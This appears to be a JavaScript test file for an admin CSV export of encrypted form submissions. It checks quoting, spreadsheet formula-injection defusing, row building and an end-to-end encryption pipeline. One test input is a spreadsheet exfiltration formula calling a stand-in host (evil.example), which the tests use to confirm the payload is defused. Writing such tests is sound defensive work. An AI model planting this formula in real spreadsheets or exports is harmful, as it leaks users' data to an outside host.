/*
 * Checks for the pure half of apps/web/admin.js.
 *
 *     node dev/admin.test.mjs
 *
 * The CSV is the product. Everything else in this project exists to get
 * the data to this file intact, and a quoting bug here does not throw
 * and does not look wrong - it produces a file that opens cleanly in a
 * spreadsheet with one column shifted into the next, which is a export
 * nobody can tell from a good one until they act on it.
 *
 * The last section is the one worth having: a record built by the real
 * form, encrypted by the real crypto.js, decrypted, and turned into a
 * row. That is the whole pipeline, end to end, in one check.
 */
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";

const HERE = (p) => fileURLToPath(new URL(p, import.meta.url));

const load = async (path) => {
  const src = await readFile(HERE(path), "utf8");
  await import("data:text/javascript," + encodeURIComponent(src));
};

await load("../apps/web/admin.js");
await load("../apps/web/form.js");
await load("../apps/web/crypto.js");

const { COLUMNS, rowFor, csvCell, toCsv, fileName } = globalThis.BinderAdmin;
const keyFile = JSON.parse(await readFile(HERE("test-key.json"), "utf8"));

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

let failures = 0;
const results = [];

async function check(label, fn) {
  let ok = false;
  let note = "";
  try {
    ok = (await fn()) === true;
    if (!ok) note = "returned false";
  } catch (error) {
    note = "threw: " + (error && error.message ? error.message : error);
  }
  if (!ok) failures++;
  results.push([ok, label, note]);
}

/* A stored row and the record inside it, as admin.js sees them. */
const SUBMISSION = { id: 7, ciphertext: "…", received_at: "2026-08-04T12:00:05.000Z" };
const RECORD = {
  record: 1,
  submittedAt: "2026-08-04T12:00:00.000Z",
  telegram: "somehandle",
  weight: { kg: 90.7, lb: 200 },
  height: { cm: 177.8, totalInches: 70, feet: 5, inches: 10 },
  entered: { units: "imperial", weight: "200 lb", height: "5 ft 10 in" },
  gender: "male",
  roles: ["feedee", "gainer"],
  country: "US",
  over18: true,
};

/* ------------------------------------------------------------------ */
/* Quoting. RFC 4180, and the spreadsheet's own habits.                */

await check("an ordinary value is left alone", () =>
  csvCell("somehandle") === "somehandle");

await check("a value with a comma is quoted", () =>
  csvCell("Bonaire, Sint Eustatius and Saba") ===
    '"Bonaire, Sint Eustatius and Saba"');

/* The one that silently corrupts a file: an unescaped quote ends the
 * field early and every column after it shifts. */
await check("a quote is doubled and the field quoted", () =>
  csvCell('say "hi"') === '"say ""hi"""');

await check("a newline is quoted rather than breaking the row", () =>
  csvCell("two\nlines") === '"two\nlines"');

await check("empty and missing become an empty cell", () =>
  csvCell("") === "" && csvCell(null) === "" && csvCell(undefined) === "");

await check("numbers survive as numbers", () =>
  csvCell(90.7) === "90.7" && csvCell(0) === "0");

/*
 * Formula injection. This file is opened in Excel, Numbers or Sheets,
 * where a cell starting =, +, - or @ is executed rather than shown. The
 * form's validation means nothing legitimate starts that way - but a
 * record is whatever arrived, and the browser that produced it is not
 * one this design trusts.
 */
await check("a leading = is defused", () =>
  csvCell("=1+1") === "'=1+1");

await check("a leading @ is defused", () =>
  csvCell("@SUM(A1)") === "'@SUM(A1)");

/* Defusing and quoting compose: this one needs both, so the cell opens
 * with a quote and the apostrophe sits inside it, where the spreadsheet
 * will read it. */
await check("the classic exfiltration formula is defused", () => {
  const cell = csvCell('=HYPERLINK("http://evil.example/"&A1,"click")');
  return cell.startsWith("\"'=") && cell.includes('""http://evil.example/""');
});

await check("defusing still quotes when it has to", () => {
  const cell = csvCell("=a,b");
  return cell === '"\'=a,b"';
});

/* ------------------------------------------------------------------ */
/* One record to one row.                                              */

await check("a row has one cell per column", () =>
  rowFor(SUBMISSION, RECORD).length === COLUMNS.length);

await check("both unit systems reach the row", () => {
  const row = rowFor(SUBMISSION, RECORD);
  const cell = (name) => row[COLUMNS.indexOf(name)];
  return cell("weight_kg") === 90.7 && cell("weight_lb") === 200 &&
    cell("height_cm") === 177.8 && cell("height_feet") === 5 &&
    cell("height_inches") === 10 && cell("height_total_inches") === 70;
});

await check("what was typed reaches the row", () => {
  const row = rowFor(SUBMISSION, RECORD);
  const cell = (name) => row[COLUMNS.indexOf(name)];
  return cell("entered_units") === "imperial" &&
    cell("entered_weight") === "200 lb" &&
    cell("entered_height") === "5 ft 10 in";
});

await check("the server's receipt and the client's timestamp are both kept",
  () => {
    const row = rowFor(SUBMISSION, RECORD);
    return row[COLUMNS.indexOf("received_at")] === SUBMISSION.received_at &&
      row[COLUMNS.indexOf("submitted_at")] === RECORD.submittedAt;
  });

await check("roles become one cell", () =>
  rowFor(SUBMISSION, RECORD)[COLUMNS.indexOf("roles")] === "feedee;gainer");

/*
 * A record from an older version of the form will not carry every
 * field. An empty cell is honest; a zero or an "undefined" is a claim
 * about someone's body that nobody made.
 */
await check("a missing field is empty, not undefined", () => {
  const row = rowFor({ id: 1 }, { telegram: "x" });
  return row.every((cell) => cell !== undefined && cell !== null) &&
    row[COLUMNS.indexOf("weight_kg")] === "" &&
    row[COLUMNS.indexOf("gender")] === "";
});

await check("an absent 18+ confirmation is not reported as yes", () =>
  rowFor(SUBMISSION, Object.assign({}, RECORD, { over18: false }))[
    COLUMNS.indexOf("over18")] === "");

/* ------------------------------------------------------------------ */
/* The file.                                                           */

await check("the header names every column, in order", () =>
  toCsv([]).split("\r\n")[0] === COLUMNS.join(","));

await check("rows are CRLF-terminated, per RFC 4180", () => {
  const csv = toCsv([rowFor(SUBMISSION, RECORD)]);
  return csv.endsWith("\r\n") && csv.split("\r\n").length === 3;
});

await check("a file with no rows is still a valid file", () =>
  toCsv([]) === COLUMNS.join(",") + "\r\n");

await check("the filename carries the export date", () =>
  fileName(Date.UTC(2026, 7, 4, 12, 0, 0)) ===
    "hang-gangs-binder-2026-08-04.csv");

/* ------------------------------------------------------------------ */
/* The whole pipeline.                                                 */

await check("a submitted record survives encryption and reaches the CSV",
  async () => {
    const record = globalThis.BinderForm.buildRecord({
      telegram: "@SomeHandle",
      units: "imperial",
      weightLb: "200",
      heightFeet: "5",
      heightInches: "10",
      gender: "male",
      roles: ["feedee", "gainer"],
      country: "US",
      over18: true,
    }, Date.UTC(2026, 7, 4, 12, 0, 0));

    const blob = await globalThis.BinderCrypto.encrypt(
      record, keyFile.publicKey);
    const back = await globalThis.BinderCrypto.decrypt(blob, keyFile);

    const csv = toCsv([rowFor(
      { id: 1, received_at: "2026-08-04T12:00:05.000Z" }, back)]);
    const cells = csv.split("\r\n")[1].split(",");
    const cell = (name) => cells[COLUMNS.indexOf(name)];

    return cell("telegram") === "somehandle" &&
      cell("weight_kg") === "90.7" && cell("weight_lb") === "200" &&
      cell("height_cm") === "177.8" && cell("height_feet") === "5" &&
      cell("roles") === "feedee;gainer" && cell("over18") === "yes";
  });

/* A row that will not open must be reported, not skipped. This proves
 * the throw admin.js counts on actually happens. */
await check("a row encrypted to another key refuses to open", async () => {
  const otherKey = await crypto.subtle.generateKey(
    { name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
  const raw = new Uint8Array(
    await crypto.subtle.exportKey("raw", otherKey.publicKey));
  let binary = "";
  for (const b of raw) binary += String.fromCharCode(b);

  const blob = await globalThis.BinderCrypto.encrypt(
    { telegram: "x" }, btoa(binary));
  try {
    await globalThis.BinderCrypto.decrypt(blob, keyFile);
    return false;
  } catch (error) {
    return /could not be opened/.test(error.message);
  }
});

/* ------------------------------------------------------------------ */

for (const [ok, label, note] of results) {
  console.log((ok ? "  ok   " : "  FAIL ") + label + (note ? " - " + note : ""));
}
console.log(
  failures === 0
    ? "\nadmin.js OK - " + results.length + " checks"
    : "\nadmin.js FAILED " + failures + " of " + results.length + " checks");

process.exit(failures === 0 ? 0 : 1);
